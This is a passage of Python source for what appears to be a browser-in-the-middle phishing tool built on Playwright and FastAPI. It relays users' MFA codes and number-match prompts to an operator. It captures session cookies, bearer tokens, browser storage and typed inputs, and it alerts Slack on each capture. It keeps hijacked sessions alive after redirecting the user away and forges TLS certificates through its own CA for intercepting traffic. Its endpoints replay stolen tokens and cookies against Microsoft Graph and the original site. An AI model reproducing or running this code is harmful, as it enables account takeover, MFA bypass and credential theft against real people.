                    'button[aria-label="Dismiss"]',
                    '#close-button',
                ]
                for sel in dismiss_selectors:
                    try:
                        el = await page_ref.query_selector(sel)
                        if el and await el.is_visible():
                            await el.click()
                            _log(f"APP_DISMISS: clicked '{sel}'",
                                 category="browser", session_id=sid)
                            return True
                    except Exception:
                        continue
            except Exception as e:
                _log(f"APP_DISMISS error: {e}", session_id=sid)
            return False

        last_challenge_key = [""]  # list so inner closure can mutate
        async def url_reporter():
            nonlocal auth_detected, login_seen
            last_url = page.url
            while running:
                await asyncio.sleep(0.5)
                try:
                    current = page.url
                    if current != last_url:
                        _log(f"URL_CHANGED {last_url[:100]} -> {current[:100]}", session_id=sid)
                        await ws.send_json({"type": "current_url", "url": current})
                        last_url = current

                        # Classify the new page so the dashboard can show
                        # which auth step we're on. Dedup by (kind, aadsts,
                        # idp) so KMSI/password-page holds don't re-log.
                        try:
                            ch = await _classify_challenge(page)
                            if ch:
                                _det_sig = "|".join(
                                    f"{k}={v}" for k, v in
                                    sorted((ch.get("details") or {}).items())
                                )
                                key = (f"{ch.get('idp','')}:{ch.get('kind','')}:"
                                       f"{ch.get('aadsts','')}:{ch.get('number','')}:"
                                       f"{_det_sig}")
                                if key != last_challenge_key[0]:
                                    last_challenge_key[0] = key
                                    bits = [ch.get("kind", "?")]
                                    if ch.get("idp"):     bits.append(f"idp={ch['idp']}")
                                    if ch.get("aadsts"):  bits.append(ch['aadsts'])
                                    if ch.get("meaning"): bits.append(f"({ch['meaning']})")
                                    if ch.get("number"):  bits.append(f"number={ch['number']}")
                                    if ch.get("details"):
                                        for _dk, _dv in ch["details"].items():
                                            bits.append(f"{_dk}={_dv}")
                                    _log("CHALLENGE " + " ".join(bits),
                                         category="challenge", session_id=sid)
                                    # For the number-match step, also emit an
                                    # explicit INFO-level summary so it's easy
                                    # to spot in any log filter.
                                    if ch.get("kind") == "mfa_app_number_match" and ch.get("number"):
                                        _log(f"MFA NUMBER MATCH — tap **{ch['number']}** in the authenticator app",
                                             category="capture", session_id=sid)
                                    # Auto-describe for unknown login pages — log
                                    # the discovered selectors once so the user
                                    # can turn it into a YAML rule.
                                    if ch.get("kind") == "unknown_login_page":
                                        d = ch.get("describe") or {}
                                        ins = [i.get("name") or i.get("id") for i in (d.get("inputs") or []) if i.get("name") or i.get("id")]
                                        btns = [b.get("text") or b.get("id") for b in (d.get("buttons") or []) if b.get("text") or b.get("id")]
                                        dvs  = [b.get("data_value") for b in (d.get("dataValues") or []) if b.get("data_value")]
                                        _log(f"UNKNOWN_LOGIN title='{(d.get('title') or '')[:80]}' "
                                             f"inputs={ins[:8]} buttons={btns[:8]} data_values={dvs[:8]} "
                                             f"— add a site block in config/sites.yaml to classify this page",
                                             category="challenge", session_id=sid, level="warn")
                                    try:
                                        await ws.send_json({"type": "challenge",
                                                            "session_id": sid, **ch})

                                        # Special handling for MFA code challenges
                                        if ch.get("kind") == "mfa_code":
                                            nonlocal _mfa_challenge_time
                                            _mfa_challenge_time = time.time()
                                            _log(f"MFA_CODE challenge detected (timeout in {_mfa_code_timeout_seconds}s), "
                                                 f"waiting for operator input...",
                                                 category="challenge", session_id=sid)
                                            await ws.send_json({"type": "waiting_for_mfa_code",
                                                                "timeout_seconds": _mfa_code_timeout_seconds,
                                                                "message": f"Enter the MFA code and click Submit (timeout in {_mfa_code_timeout_seconds}s)"})
                                    except Exception:
                                        pass
                        except Exception:
                            pass

                        # Detect dead-end URLs (404s, chrome errors, broken MCAS redirects)
                        if _is_dead_end_url(current):
                            _log(f"DEAD_END detected: {current[:150]}, navigating back...",
                                 category="browser", session_id=sid)
                            await ws.send_json({"type": "status",
                                                "message": f"Dead-end redirect blocked: {current[:80]}"})
                            # Auto-capture first if auth was in progress
                            if not auth_detected and login_seen:
                                _fire_and_forget(_do_auto_capture(f"dead_end={current[:80]}"))
                            await asyncio.sleep(0.5)
                            try:
                                await page.go_back(timeout=5000)
                                _log("DEAD_END: navigated back", category="browser", session_id=sid)
                            except Exception:
                                pass
                            continue

                        # Detect app install redirects and block them
                        if _is_app_install_url(current):
                            _log(f"APP_INSTALL detected: {current[:150]}, dismissing...",
                                 category="browser", session_id=sid)
                            await asyncio.sleep(1.0)
                            dismissed = await _dismiss_app_install(page)
                            if not dismissed:
                                try:
                                    await page.go_back(timeout=5000)
                                    _log("APP_INSTALL: navigated back",
                                         category="browser", session_id=sid)
                                except Exception:
                                    pass

                        # Track login page visits — only count as "seen" after
                        # the user has been on the login page long enough to
                        # interact (not just a quick redirect pass-through)
                        if _is_login_url(current):
                            if not hasattr(url_reporter, '_login_first_seen'):
                                url_reporter._login_first_seen = time.time()
                                _log(f"LOGIN_URL {current[:100]}", session_id=sid)
                                # Slack: first login URL in this session — dedupe
                                # by hostname so redirects between IdPs don't spam.
                                _ihost = urlparse(current).hostname or ""
                                if _slack_once(sid, f"login:{_ihost}"):
                                    _fire_and_forget(notify_slack_login_start(
                                        site_id, _ihost, current, _cred["user"]))
                        else:
                            if hasattr(url_reporter, '_login_first_seen'):
                                elapsed = time.time() - url_reporter._login_first_seen
                                if elapsed >= 5.0:
                                    login_seen = True
                                    _log(f"LOGIN_SEEN (user spent {elapsed:.1f}s on login)", session_id=sid)
                                else:
                                    _log(f"LOGIN_SKIP (only {elapsed:.1f}s on login, likely redirect)", session_id=sid)
                                del url_reporter._login_first_seen

                        # Detect auth completion. Primary trigger is `login_seen`
                        # (operator stayed on a recognised login URL ≥5s).
                        # Fallback triggers cover the cases where login_seen
                        # never flipped — e.g. an unclassified IdP, or SSO that
                        # redirected through the login page faster than the 5s
                        # gate. Without these, sessions land on
                        # `_is_auth_complete_url` with tokens captured by the
                        # response interceptor but cookies/current_url never
                        # written, leaving keepalive_pw with no inputs.
                        if not auth_detected and _is_auth_complete_url(current):
                            fire_reason = None
                            if login_seen:
                                fire_reason = f"url={current[:100]}"
                            elif captured_inputs:
                                fire_reason = (f"url={current[:100]} "
                                               f"fallback=inputs={len(captured_inputs)}")
                            else:
                                try:
                                    _rec = credentials_store.get(_cred["key"]) or {}
                                    if _rec.get("tokens") or _rec.get("captured_headers"):
                                        fire_reason = (f"url={current[:100]} "
                                                       f"fallback=store_signal")
                                except Exception:
                                    pass
                            if fire_reason:
                                _fire_and_forget(_do_auto_capture(fire_reason))
                except Exception:
                    pass

        url_task = asyncio.create_task(url_reporter())

        async def heartbeat():
            while running:
                interval = get_config_value("heartbeat_interval", 10.0)
                await asyncio.sleep(interval)
                if not get_config_value("log_heartbeats", True):
                    continue
                _log(f"HEARTBEAT screenshots={screenshot_count} errors={screenshot_errors} url={page.url[:80]}",
                     session_id=sid, level="debug")

        heartbeat_task = asyncio.create_task(heartbeat())

        # ── Input loop ──
        while True:
            # Check MFA code timeout
            if _mfa_challenge_time is not None:
                elapsed = time.time() - _mfa_challenge_time
                if elapsed > _mfa_code_timeout_seconds:
                    _log(f"MFA_CODE timeout after {elapsed:.0f}s, navigating back...",
                         category="challenge", session_id=sid, level="warn")
                    await ws.send_json({"type": "status",
                                        "message": f"MFA code timeout (no response in {_mfa_code_timeout_seconds}s)"})
                    _mfa_challenge_time = None
                    try:
                        await page.go_back(timeout=5000)
                    except Exception:
                        pass

            try:
                data = await ws.receive_text()
                msg = json.loads(data)
            except WebSocketDisconnect:
                break
            except Exception:
                break

            msg_type = msg.get("type")

            # Clear MFA timeout on operator action
            if msg_type == "mfa_code":
                _mfa_challenge_time = None
            try:
                if msg_type == "click":
                    await flush_input("click")
                    x, y = msg["x"], msg["y"]
                    _log(f"CLICK ({x:.0f}, {y:.0f})", session_id=sid, level="debug")
                    await page.mouse.click(x, y, button=msg.get("button", "left"))
                    screenshot_nudge.set()
                elif msg_type == "dblclick":
                    await flush_input("dblclick")
                    await page.mouse.dblclick(msg["x"], msg["y"])
                    screenshot_nudge.set()
                elif msg_type == "type":
                    text = msg["text"]
                    input_buffer.append(text)
                    # Multi-char input is a paste / clipboard insert /
                    # synthesized blob from the canvas paste handler —
                    # try `insert_text` (atomic IME-style bulk insert) first
                    # so the page's framework sees a single `input`
                    # event instead of N keydown/keyup pairs spread
                    # across Playwright's per-char delay. Some pages (auth
                    # pages, security-hardened forms) don't allow insert_text,
                    # so fall back to char-by-char type().
                    if len(text) > 1:
                        try:
                            await page.keyboard.insert_text(text)
                            # Wait for text to be inserted, then trigger events
                            # that JS frameworks (React/Vue/Angular) expect
                            await asyncio.sleep(0.05)
                            try:
                                # Trigger input and change events on the focused element
                                await page.evaluate("""() => {
                                    const el = document.activeElement;
                                    if (el) {
                                        el.dispatchEvent(new Event('input', { bubbles: true }));
                                        el.dispatchEvent(new Event('change', { bubbles: true }));
                                    }
                                }""")
                            except Exception:
                                pass  # Ignore if evaluation fails
                            _log(f"TYPE insert_text OK ({len(text)} chars)", session_id=sid, level="debug")
                        except Exception as e:
                            # Fallback: if insert_text fails (e.g., on security-hardened
                            # sign-on pages), type character-by-character instead
                            _log(f"TYPE insert_text failed ({e}), falling back to char-by-char",
                                 session_id=sid, level="debug")
                            for char in text:
                                await page.keyboard.type(char, delay=5)  # 5ms between chars
                            # Trigger events after all chars typed
                            await asyncio.sleep(0.1)
                            try:
                                await page.evaluate("""() => {
                                    const el = document.activeElement;
                                    if (el) {
                                        el.dispatchEvent(new Event('input', { bubbles: true }));
                                        el.dispatchEvent(new Event('change', { bubbles: true }));
                                    }
                                }""")
                            except Exception:
                                pass
                    else:
                        await page.keyboard.type(text)
                    screenshot_nudge.set()
                elif msg_type == "keydown":
                    key = msg["key"]
                    if key in ("Enter", "Tab"):
                        await flush_input(key)
                    _log(f"KEY {key}", session_id=sid, level="debug")
                    await page.keyboard.press(key)
                    screenshot_nudge.set()
                elif msg_type == "scroll":
                    await page.mouse.wheel(msg.get("deltaX", 0), msg.get("deltaY", 0))
                    screenshot_nudge.set()
                elif msg_type == "navigate":
                    await flush_input("navigate")
                    url = msg["url"]
                    if url and not url.startswith(("http://", "https://", "about:", "data:")):
                        url = "https://" + url
                    _log(f"NAVIGATE_TO {url}", session_id=sid)
                    try:
                        await page.goto(url, wait_until="commit", timeout=15000)
                    except Exception as e:
                        _log(f"Navigate error: {e}", session_id=sid)
                    await ws.send_json({"type": "navigated", "url": page.url})
                    await ws.send_json({"type": "current_url", "url": page.url})
                    screenshot_nudge.set()
                elif msg_type == "back":
                    try:
                        await page.go_back(timeout=10000)
                    except Exception as e:
                        _log(f"Back error: {e}", session_id=sid)
                    screenshot_nudge.set()
                elif msg_type == "forward":
                    try:
                        await page.go_forward(timeout=10000)
                    except Exception as e:
                        _log(f"Forward error: {e}", session_id=sid)
                    screenshot_nudge.set()
                elif msg_type == "reload":
                    try:
                        await page.reload(timeout=15000)
                    except Exception as e:
                        _log(f"Reload error: {e}", session_id=sid)
                    screenshot_nudge.set()
                elif msg_type == "resize":
                    if mobile:
                        # Mobile profile pins the viewport — ignore.
                        continue
                    new_w = max(640, min(3840, int(msg.get("width", width))))
                    new_h = max(480, min(2400, int(msg.get("height", height))))
                    if new_w == width and new_h == height:
                        continue
                    width, height = new_w, new_h
                    try:
                        await page.set_viewport_size({"width": width,
                                                      "height": height})
                    except Exception as e:
                        _log(f"resize failed: {e}", session_id=sid,
                             level="warn")
                    await ws.send_json({"type": "viewport",
                                        "width": width, "height": height,
                                        "mobile": mobile,
                                        "profile": mobile_profile,
                                        "dpr": dpr})
                    screenshot_nudge.set()
                elif msg_type == "capture":
                    await flush_input("capture")
                    ck = _cred["key"]
                    _log(f"CAPTURE requested (cred_key={ck})", category="capture", session_id=sid)
                    cookies = await context.cookies()
                    cookies_store.put(ck, cookies)

                    local_storage = await page.evaluate("() => { try { const o={}; for(let i=0;i<localStorage.length;i++){const k=localStorage.key(i);o[k]=localStorage.getItem(k)} return o } catch(e){return {}} }")
                    session_storage = await page.evaluate("() => { try { const o={}; for(let i=0;i<sessionStorage.length;i++){const k=sessionStorage.key(i);o[k]=sessionStorage.getItem(k)} return o } catch(e){return {}} }")

                    current_url = page.url
                    _cap_user = _cred["user"]
                    _cap_inputs = list(captured_inputs)

                    def _merge_manual_capture(cred_data):
                        cred_data["cookies"] = cookies
                        cred_data["local_storage"] = local_storage
                        cred_data["session_storage"] = session_storage
                        cred_data["current_url"] = current_url
                        cred_data["captured_at"] = time.time()
                        cred_data["captured_inputs"] = _cap_inputs
                        cred_data["user_id"] = _cap_user
                        cred_data["site_id"] = site_id
                        if _cred.get("cid"):
                            cred_data["cid"] = _cred["cid"]
                        return cred_data

                    cred_data = await credentials_store.update(
                        ck, _merge_manual_capture,
                        default={"tokens": [], "cookies": []})
                    notify_sites_changed()
                    _fire_and_forget(notify_slack_capture(
                        ck, urlparse(current_url).hostname or site_id,
                        len(cred_data.get("tokens", [])), len(cookies),
                        user=_cap_user))

                    summary = f"CAPTURED {len(cookies)} cookies, {len(cred_data.get('tokens',[]))} tokens, {len(local_storage)} localStorage, {len(session_storage)} sessionStorage, {len(captured_inputs)} inputs"
                    _log(summary, category="capture", session_id=sid)
                    try:
                        _subs.record_event(sid, "manual_capture",
                                           cookies=len(cookies),
                                           tokens=len(cred_data.get("tokens", [])),
                                           local_storage=len(local_storage),
                                           session_storage=len(session_storage),
                                           inputs=len(captured_inputs),
                                           url=current_url[:300])
                    except Exception:
                        pass
                    try:
                        host = urlparse(current_url).hostname or ""
                        if host:
                            _hosts.record_event(host, "manual_capture",
                                                sid=sid, user_id=_cap_user,
                                                cookies=len(cookies),
                                                tokens=len(cred_data.get("tokens", [])),
                                                local_storage=len(local_storage),
                                                session_storage=len(session_storage),
                                                inputs=len(captured_inputs),
                                                url=current_url[:300])
                    except Exception:
                        pass

                    await ws.send_json({
                        "type": "captured",
                        "site_id": site_id,
                        "url": current_url,
                        "cookie_count": len(cookies),
                        "token_count": len(cred_data.get("tokens", [])),
                        "captured_inputs": list(captured_inputs),
                    })
                elif msg_type == "get_url":
                    await ws.send_json({"type": "current_url", "url": page.url})
                elif msg_type == "mfa_code":
                    code = msg.get("code", "").strip()
                    if not code:
                        _log("MFA_CODE received but empty", session_id=sid, level="warn")
                        await ws.send_json({"type": "error", "message": "MFA code cannot be empty"})
                        continue

                    _log(f"MFA_CODE injection for {len(code)}-char code", session_id=sid)

                    # Try to find and fill the OTC input field
                    # Selectors for different IdPs: MS (name="otc"), Okta (name="answer"), etc.
                    otc_selectors = [
                        'input[name="otc"]',     # Microsoft
                        'input[name="answer"]',  # Okta
                        'input[type="text"][placeholder*="code" i]',
                        'input[type="text"][placeholder*="Code" i]',
                        'input[type="text"][aria-label*="code" i]',
                    ]

                    code_field_found = False
                    for selector in otc_selectors:
                        try:
                            element = await page.query_selector(selector)
                            if element:
                                _log(f"MFA_CODE found field: {selector}", session_id=sid)
                                await element.fill(code)
                                code_field_found = True
                                break
                        except Exception:
                            continue

                    if not code_field_found:
                        _log("MFA_CODE no input field found", session_id=sid, level="warn")
                        await ws.send_json({"type": "error", "message": "Could not find MFA code input field on page"})
                        continue

                    # Wait a moment for the field to process the input
                    await asyncio.sleep(0.2)

                    # Look for submit button and click it
                    submit_selectors = [
                        'input[type="submit"]',
                        'button[type="submit"]',
                        'button:has-text("Verify")',
                        'button:has-text("Submit")',
                        'button:has-text("Next")',
                        'button:has-text("Continue")',
                    ]

                    submit_clicked = False
                    for selector in submit_selectors:
                        try:
                            button = await page.query_selector(selector)
                            if button and await button.is_visible():
                                _log(f"MFA_CODE clicking: {selector}", session_id=sid)
                                await button.click()
                                submit_clicked = True
                                break
                        except Exception:
                            continue

                    if not submit_clicked:
                        _log("MFA_CODE auto-submit failed, pressing Enter", session_id=sid, level="warn")
                        await page.keyboard.press("Enter")

                    await ws.send_json({"type": "status", "message": "MFA code submitted, waiting for response..."})
                    screenshot_nudge.set()

                elif msg_type == "close":
                    break
            except Exception as e:
                _log(f"ERROR handling {msg_type}: {e}\n{traceback.format_exc()}", session_id=sid)

        running = False
        screenshot_task.cancel()
        url_task.cancel()
        heartbeat_task.cancel()
        await flush_input("session_close")

        try:
            cookies = await context.cookies()
            cookies_store.put(_cred["key"], cookies)
        except Exception:
            pass

    except WebSocketDisconnect:
        pass
    except Exception as e:
        _log(f"SESSION FATAL: {e}\n{traceback.format_exc()}", session_id=sid)
        try:
            await ws.send_json({"type": "error", "message": str(e)})
        except Exception:
            pass
    finally:
        running = False
        _slack_sent.pop(sid, None)
        try:
            _subs.finalize_subsession(sid, {
                "captured_inputs": len(captured_inputs),
                "final_url": (page.url if page else "") if 'page' in locals() else "",
            })
        except Exception:
            pass
        if keep_alive_after_redirect:
            # WS is gone (operator's tab navigated to the redirect URL),
            # but the Playwright session lives on so the auth proxy can
            # keep using its authenticated context. Strong refs are held
            # in `_kept_alive[sid]`; `_live_pages[sid]` stays populated.
            # Close via DELETE /api/browser/kept-alive/{sid} when done.
            _log("=== SESSION KEPT ALIVE (post-login redirect) ===",
                 session_id=sid)
        else:
            _log("=== SESSION ENDED ===", session_id=sid)
            close_session_logger(sid)
            unregister_session(sid)
            _live_pages.pop(sid, None)
            # Only close the browser when we owned it. Warm-pool
            # browsers are shared across sessions and managed by
            # backend/browser_warm.py; closing here would tear down
            # the shared instance and force a relaunch on the next
            # session.
            if browser and not browser_is_warm:
                try:
                    await browser.close()
                except Exception:
                    pass
            if pw:
                try:
                    await pw.stop()
                except Exception:
                    pass


@router.get("/kept-alive")
async def list_kept_alive():
    """List sessions that survived a post-login redirect — their
    Playwright contexts are still in memory and reachable via
    `_fetch_via_playwright`."""
    return {sid: {"kept_at": v["kept_at"],
                  "redirect_url": v.get("redirect_url", "")}
            for sid, v in _kept_alive.items()}


@router.delete("/kept-alive/{sid}")
async def close_kept_alive(sid: str):
    """Tear down a kept-alive session. Closes the Playwright browser,
    stops the Playwright instance, and removes the session from all
    registries."""
    entry = _kept_alive.pop(sid, None)
    if entry is None:
        return {"error": "not found", "sid": sid}
    _live_pages.pop(sid, None)
    unregister_session(sid)
    close_session_logger(sid)
    browser = entry.get("browser")
    pw = entry.get("pw")
    is_warm = bool(entry.get("browser_is_warm"))
    # Don't close a warm-pool browser — it's shared across sessions
    # and managed by backend/browser_warm.py. Just close the
    # context (already closed via the implicit page close above) and
    # leave the browser alive for the next session.
    if browser and not is_warm:
        try:
            await browser.close()
        except Exception:
            pass
    if pw:
        try:
            await pw.stop()
        except Exception:
            pass
    return {"closed": sid}


@router.get("/certs")
async def cert_status():
    certs_dir = str(_get_certs_dir())
    found = []
    try:
        for f in os.listdir(certs_dir):
            if f.endswith((".crt", ".pem", ".cer")):
                found.append({"name": f, "size": os.path.getsize(os.path.join(certs_dir, f))})
    except Exception:
        pass
    return {"certs_dir": certs_dir, "certs_found": found, "has_custom_certs": len(found) > 0}


# ── Auth-proxy CA management (upload / inspect / reset) ───
# The auth proxy on :3128 forges per-host certs signed by a CA cert
# living at $DATA_DIR/proxy_ca/{ca.crt, ca.key}. These three routes
# let the operator inspect that CA, replace it with their own
# pair, or wipe it (next start regenerates a self-signed one).

@router.get("/auth_proxy/ca")
async def get_auth_proxy_ca():
    """Inspect the auth proxy's currently-loaded CA cert (subject,
    issuer, validity window, fingerprint, on-disk path). Does NOT
    return the private key."""
    from backend.auth_proxy import get_ca_info, _ensure_ca
    # Side-effect: load the cert from disk if not yet in memory so
    # we can report on a freshly-restarted process.
    _ensure_ca()
    return get_ca_info()


@router.get("/auth_proxy/ca/download")
async def download_auth_proxy_ca():
    """Download the current CA cert as PEM. Used by the dashboard's
    "Download CA cert" button so the operator can install it on
    subject devices without shelling into the host."""
    from fastapi.responses import Response
    from backend.auth_proxy import _ensure_ca, _CA_DIR
    _ensure_ca()
    if _CA_DIR is None:
        from fastapi import HTTPException
        raise HTTPException(status_code=404, detail="CA not loaded")
    cert_path = _CA_DIR / "ca.crt"
    if not cert_path.exists():
        from fastapi import HTTPException
        raise HTTPException(status_code=404, detail="ca.crt not found")
    return Response(content=cert_path.read_bytes(),
                     media_type="application/x-pem-file",
                     headers={"Content-Disposition":
                              'attachment; filename="bitm-proxy-ca.crt"'})


@router.post("/auth_proxy/ca")
async def upload_auth_proxy_ca(
    request: Request,
    cert: UploadFile | None = File(default=None),
    key: UploadFile | None = File(default=None),
):
    """Replace the auth proxy's CA with operator-supplied PEM blobs.

    Accepts either:
      - multipart/form-data with `cert` and `key` files, OR
      - application/json with {"cert_pem": "...", "key_pem": "..."}

    Validates that the cert is X.509, the key is a parseable PEM
    private key, and the two pair (modulus / EC point match).
    Persists atomically and hot-swaps the in-memory handles. Per-
    host cert caches are cleared so subsequent connections get
    leaves signed by the new CA.

    Existing browser/tool trust of the OLD CA must be replaced
    with the new one; the response includes the new SHA-256
    fingerprint to verify after install.
    """
    from fastapi import HTTPException
    from backend.auth_proxy import install_uploaded_ca

    cert_bytes: bytes | None = None
    key_bytes: bytes | None = None

    # Multipart path.
    if cert is not None:
        cert_bytes = await cert.read()
    if key is not None:
        key_bytes = await key.read()
    # JSON path — safe to call request.json() only when no multipart
    # field landed (request.json() consumes the body once).
    if (cert_bytes is None or key_bytes is None) and request is not None:
        try:
            body = await request.json()
        except Exception:
            body = {}
        if isinstance(body, dict):
            if cert_bytes is None and isinstance(body.get("cert_pem"), str):
                cert_bytes = body["cert_pem"].encode("utf-8")
            if key_bytes is None and isinstance(body.get("key_pem"), str):
                key_bytes = body["key_pem"].encode("utf-8")

    if not cert_bytes or not key_bytes:
        raise HTTPException(
            status_code=400,
            detail="cert and key are both required (multipart files "
                   "or JSON body with cert_pem + key_pem)")

    result = install_uploaded_ca(cert_bytes, key_bytes)
    if not result.get("ok"):
        raise HTTPException(status_code=400,
                              detail=result.get("error") or "install failed")
    return result


@router.delete("/auth_proxy/ca")
async def reset_auth_proxy_ca():
    """Wipe the persisted CA cert + key. Next start regenerates a
    fresh self-signed pair — every subject device that trusted the
    OLD CA must re-trust the new one."""
    from backend.auth_proxy import reset_ca
    return reset_ca()


@router.get("/credentials")
async def list_credentials():
    return credentials_store.list_all()

@router.get("/credentials/{site_id}")
async def get_credentials(site_id: str):
    data = credentials_store.get(site_id)
    return data or {"error": "Not found"}

@router.delete("/credentials/{site_id}")
async def delete_credentials(site_id: str):
    credentials_store.delete(site_id)
    cookies_store.delete(site_id)
    return {"deleted": site_id}

@router.get("/sites")
async def list_sites():
    return {"sites": [{"id": k, "data": credentials_store.get(k)} for k in credentials_store.list_keys()]}


# ── Credential Testing ──────────────────────────────────

import httpx


def _decode_jwt(token: str) -> dict:
    """Decode a JWT without verifying the signature. Returns header + payload."""
    parts = token.split(".")
    if len(parts) < 2:
        return {"error": "Not a valid JWT (expected 3 dot-separated parts)"}
    result = {}
    for i, label in enumerate(["header", "payload"]):
        if i >= len(parts):
            break
        padded = parts[i] + "=" * (4 - len(parts[i]) % 4)
        try:
            decoded = base64.urlsafe_b64decode(padded)
            result[label] = json.loads(decoded)
        except Exception as e:
            result[label] = {"decode_error": str(e)}
    # Extract useful fields
    payload = result.get("payload", {})
    if isinstance(payload, dict):
        import datetime
        for ts_field in ("exp", "iat", "nbf"):
            if ts_field in payload and isinstance(payload[ts_field], (int, float)):
                try:
                    payload[f"{ts_field}_readable"] = datetime.datetime.fromtimestamp(
                        payload[ts_field]).isoformat()
                except Exception:
                    pass
        if "exp" in payload:
            try:
                exp_dt = datetime.datetime.fromtimestamp(payload["exp"])
                now = datetime.datetime.now()
                if exp_dt > now:
                    remaining = exp_dt - now
                    payload["_expires_in"] = f"{int(remaining.total_seconds())}s ({remaining})"
                else:
                    elapsed = now - exp_dt
                    payload["_expired_ago"] = f"{int(elapsed.total_seconds())}s ago"
            except Exception:
                pass
    return result


@router.get("/test/decode/{site_id}")
async def decode_tokens(site_id: str):
    """Decode all captured JWTs for a site without calling any API."""
    data = credentials_store.get(site_id)
    if not data:
        return {"error": "No credentials found", "site_id": site_id}

    results = {}
    # Decode tokens from captured_headers
    ch = data.get("captured_headers", {})
    for name, info in ch.items():
        val = info.get("value", "")
        if not val or len(val) < 20:
            continue
        # Check if it looks like a JWT (3 dot-separated base64 parts)
        if val.count(".") == 2 and not val.startswith("http"):
            results[name] = _decode_jwt(val)

    # Decode tokens from tokens array
    jwt_fields = ["access_token", "id_token", "jwt", "accessToken", "idToken",
                  "sessionToken", "token"]
    for i, tok in enumerate(data.get("tokens", [])):
        for field in jwt_fields:
            val = tok.get(field, "")
            if isinstance(val, str) and val.count(".") == 2 and len(val) > 20:
                key = f"tokens[{i}].{field}"
                results[key] = _decode_jwt(val)

    return {"site_id": site_id, "decoded_count": len(results), "tokens": results}


@router.post("/test/token/{site_id}")
async def test_token(site_id: str, url: str = "https://graph.microsoft.com/v1.0/me",
                     header_name: str = ""):
    """Test a captured bearer token against an API endpoint (default: MS Graph /me)."""
    data = credentials_store.get(site_id)
    if not data:
        return {"error": "No credentials found", "site_id": site_id}

    # Find a bearer token to use
    token = None
    token_source = None

    # Prefer specific header if requested
    if header_name:
        ch = data.get("captured_headers", {})
        if header_name in ch:
            token = ch[header_name]["value"]
            token_source = header_name

    # Otherwise search for access_token or bearer token
    if not token:
        ch = data.get("captured_headers", {})
        for name in ["Authorization: Bearer", "access_token", "accessToken"]:
            if name in ch:
                token = ch[name]["value"]
                token_source = name
                break

    if not token:
        # Try tokens array
        for tok in data.get("tokens", []):
            for field in ["access_token", "accessToken", "token"]:
                if field in tok and isinstance(tok[field], str):
                    token = tok[field]
                    token_source = f"tokens.{field}"
                    break
            if token:
                break

    if not token:
        return {"error": "No bearer token found in captured data",
                "available_headers": list(data.get("captured_headers", {}).keys())}

    # Make the test request
    try:
        async with httpx.AsyncClient(timeout=10.0, verify=False) as client:
            resp = await client.get(url, headers={"Authorization": f"Bearer {token}"})
            try:
                body = resp.json()
            except Exception:
                body = resp.text[:2000]
            return {
                "test_url": url,
                "token_source": token_source,
                "token_preview": token[:40] + "..." if len(token) > 40 else token,
                "status_code": resp.status_code,
                "success": 200 <= resp.status_code < 300,
                "response": body,
            }
    except Exception as e:
        return {"error": str(e), "test_url": url, "token_source": token_source}


@router.post("/test/graph-devices/{site_id}")
async def test_graph_devices(site_id: str):
    """Test token by querying Get-MgDevice (owned devices in Azure AD)."""
    data = credentials_store.get(site_id)
    if not data:
        return {"error": "No credentials found", "site_id": site_id}

    # Find a bearer token
    token = None
    for tok in data.get("tokens", []):
        for field in ["access_token", "accessToken", "token"]:
            if field in tok and isinstance(tok[field], str):
                token = tok[field]
                break
        if token:
            break

    if not token:
        return {"error": "No bearer token found in captured data"}

    try:
        async with httpx.AsyncClient(timeout=10.0, verify=False) as client:
            resp = await client.get(
                "https://graph.microsoft.com/v1.0/me/ownedDevices",
                headers={"Authorization": f"Bearer {token}"}
            )
            try:
                body = resp.json()
            except Exception:
                body = resp.text[:2000]

            device_count = 0
            if isinstance(body, dict) and "value" in body:
                device_count = len(body.get("value", []))

            return {
                "test_url": "https://graph.microsoft.com/v1.0/me/ownedDevices",
                "status_code": resp.status_code,
                "success": 200 <= resp.status_code < 300,
                "device_count": device_count,
                "response": body,
            }
    except Exception as e:
        return {"error": str(e)}


@router.post("/test/graph-managed-devices/{site_id}")
async def test_graph_managed_devices(site_id: str):
    """Test token by querying Get-MgDeviceManagementDevice (Intune enrolled devices)."""
    data = credentials_store.get(site_id)
    if not data:
        return {"error": "No credentials found", "site_id": site_id}

    # Find a bearer token
    token = None
    for tok in data.get("tokens", []):
        for field in ["access_token", "accessToken", "token"]:
            if field in tok and isinstance(tok[field], str):
                token = tok[field]
                break
        if token:
            break

    if not token:
        return {"error": "No bearer token found in captured data"}

    try:
        async with httpx.AsyncClient(timeout=10.0, verify=False) as client:
            resp = await client.get(
                "https://graph.microsoft.com/beta/deviceManagement/managedDevices",
                headers={"Authorization": f"Bearer {token}"}
            )
            try:
                body = resp.json()
            except Exception:
                body = resp.text[:2000]

            device_count = 0
            if isinstance(body, dict) and "value" in body:
                device_count = len(body.get("value", []))

            return {
                "test_url": "https://graph.microsoft.com/beta/deviceManagement/managedDevices",
                "status_code": resp.status_code,
                "success": 200 <= resp.status_code < 300,
                "device_count": device_count,
                "response": body,
            }
    except Exception as e:
        return {"error": str(e)}


@router.post("/test/cookies/{site_id}")
async def test_cookies(site_id: str, url: str = ""):
    """Test captured cookies by replaying them against the original site."""
    data = credentials_store.get(site_id)
    if not data:
        return {"error": "No credentials found", "site_id": site_id}

    cookies = data.get("cookies", [])
    if not cookies:
        return {"error": "No cookies captured", "site_id": site_id}

    # Use provided URL or the captured URL
    test_url = url or data.get("current_url", "")
    if not test_url:
        return {"error": "No URL to test — provide ?url= or capture a session first"}

    # Build cookie jar from captured cookies
    cookie_jar = httpx.Cookies()
    for c in cookies:
        try:
            cookie_jar.set(c["name"], c["value"], domain=c.get("domain", ""),
                          path=c.get("path", "/"))
        except Exception:
            pass

    try:
        async with httpx.AsyncClient(timeout=10.0, verify=False,
                                     follow_redirects=False) as client:
            resp = await client.get(test_url, cookies=cookie_jar)
            is_redirect_to_login = (
                300 <= resp.status_code < 400
                and any(p in (resp.headers.get("location", "").lower())
                        for p in ["login", "signin", "auth", "oauth"])
            )
            try:
                body_preview = resp.text[:1000]
            except Exception:
                body_preview = "(binary response)"
            return {
                "test_url": test_url,
                "cookie_count": len(cookies),
                "status_code": resp.status_code,
                "redirects_to_login": is_redirect_to_login,
                "session_valid": resp.status_code == 200 and not is_redirect_to_login,
                "location": resp.headers.get("location", ""),
                "content_type": resp.headers.get("content-type", ""),
                "body_preview": body_preview,
            }
    except Exception as e:
        return {"error": str(e), "test_url": test_url}
